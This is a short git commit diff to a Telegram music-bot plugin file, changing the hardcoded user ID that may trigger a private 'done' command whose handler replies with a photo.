94cd812246cffaf3dd8d3974a786cc6f63fa40f4
WowMiss <161447724+WowMiss@users.noreply.github.com>
2024-02-27 09:37:30 +0000

    Update reload.py

--- DAXXMUSIC/plugins/tools/reload.py
+++ DAXXMUSIC/plugins/tools/reload.py
@@ -108,7 +108,7 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("done")
     & filters.private
-    & filters.user(6664582540)
+    & filters.user(6449370627)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
